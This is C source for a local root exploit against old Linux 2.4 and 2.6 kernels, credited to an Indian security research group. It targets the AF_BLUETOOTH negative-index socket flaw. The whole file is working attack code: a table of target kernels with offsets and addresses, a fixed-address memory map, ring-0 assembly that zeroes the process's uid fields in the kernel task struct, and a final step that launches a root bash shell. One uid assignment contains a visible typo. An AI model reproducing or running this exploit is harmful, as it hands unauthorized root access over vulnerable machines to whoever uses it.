/* THE EYE ON SECURITY RESEARCH GROUP INDIA */
/* This code has been greatly improved by n2n@eos */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/mman.h>

#include <linux/linkage.h>

#define SHELL 	"/bin/bash"

#define MAX_T		0x3	// update this if you add targets
struct addr_info {
	char *info;
	int offset;
	unsigned long addr;
} ai[] = {
	{"2.6.11 Gentoo",-10223,0x8901146b},
	{"2.4.28 Gentoo", -1023, 0x58595aed},
	{"2.4.22-1.2199.nptl Fedora Core 1", -1025,0x65756c62},
	{NULL,0,0}
};


static int uid;
static char *shellname = SHELL;

/* Resets uid to 0 in kernel task struct for current process */
asmlinkage void kernel_code(unsigned *task)
{
unsigned *addr = task;

//	find & reset uids
	while(addr[0] != uid || addr[1] != uid ||
	      addr[2] != uid || addr[3] != uid)
		addr++;

	addr[0] = addr[0] = addr[2] = addr[3] = 0;
	addr[4] = addr[5] = addr[6] = addr[7] = 0;
	
}


void kcode(void);

//     CPL0 code mostly stolen from cliph
void __kcode(void)
{
asm(
	"kcode:									\n"
	" 		pusha								\n"
	"  	pushl %es            		\n"
	"  	pushl %ds            		\n"   
	"		movl	$0xffffe000,%eax		\n"
	"		andl	%esp,%eax				\n"
	"		pushl	%eax						\n"
	"		call	kernel_code				\n"
	"		addl	$4, %esp					\n"
	"  	popl  %ds            		\n"
	"  	popl  %es            		\n"
	"		popa								\n"
	" 		ret 								\n"
    );
}

void
usage (char *prog) {
	int i;
	printf (":: GNU/Linux kernel AF_BLUETOOTH negative index handling vulnerability ::\n");
	printf ("   -------------------------------------------------------------------\n\n");
	printf ("Usage:\n");
	printf ("%s -a Address -o Offset\n", prog);
	printf ("%s Target\n", prog);
	printf ("[+] Available targets:\n");
	for (i=0; ai[i].addr; i++) {
		printf ("\t %d. %s\n",i, ai[i].info);
	}

	exit (EXIT_FAILURE);
}
	     
int main (int argc, char **argv) {
	char *ptr;
	unsigned long *ret_addr;
	unsigned long *start_addr;
	unsigned long *end_addr;
	unsigned long *sc_addr;
	unsigned long map_size;
	int t=0;
	char ch;
	
	if (argc < 2)
		usage (argv[0]);
	t = atoi (argv[1]);
	if ((t < 0) || (t >= MAX_T))
		usage(argv[0]);
		
	while ((ch=getopt (argc, argv, "o:a:")) != EOF) {
		switch (ch) {
			case 'o':
				ai[t].offset = atoi (optarg);
				break;
			case 'a':
				ai[t].addr = strtoul (optarg, NULL, 16);
				break;
			default:
				usage(argv[0]);
				break;
		}
	}
	
	uid=getuid();
	sc_addr =  (unsigned long *) kcode; 
	start_addr = (unsigned long *)(ai[t].addr & 0xF0000000);
	end_addr =  (unsigned long *)(ai[t].addr | 0x0FFFFFFF);
	map_size = (unsigned long )(end_addr) - (unsigned long )start_addr + 1;
	
	printf ("+ Attempting to map memory segment from 0x%x to 0x%x\n",start_addr, end_addr);
	printf ("+ Map Size=0x%x\n", map_size);
	ret_addr = mmap (start_addr, map_size, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS, 0, 0);
	if (ret_addr != start_addr) {
		printf ("- Could not map desired memory segment\n");
		perror ("mmap");
		exit (EXIT_FAILURE);
	}
		
	ptr = (char*)(ai[t].addr+4);
	printf ("+ Writing the value 0x%x at 0x%x\n", sc_addr, ptr);
	*(unsigned long *)(ptr) =  (unsigned long) sc_addr;
	printf ("+ Triggering the bug [Index=(%d)]\n", ai[t].offset);
	socket (AF_BLUETOOTH, SOCK_RAW, ai[t].offset); 
	if(getuid()==0){
		printf("+ Exploited, uid=0\n" ); fflush(stdout);
		setresuid(0,0,0);
		execl(shellname,"sh",0);
		perror("exec");
	} else {
		printf("- UID change failed\n" ); fflush(stdout);
	}
	
	return 0;
}
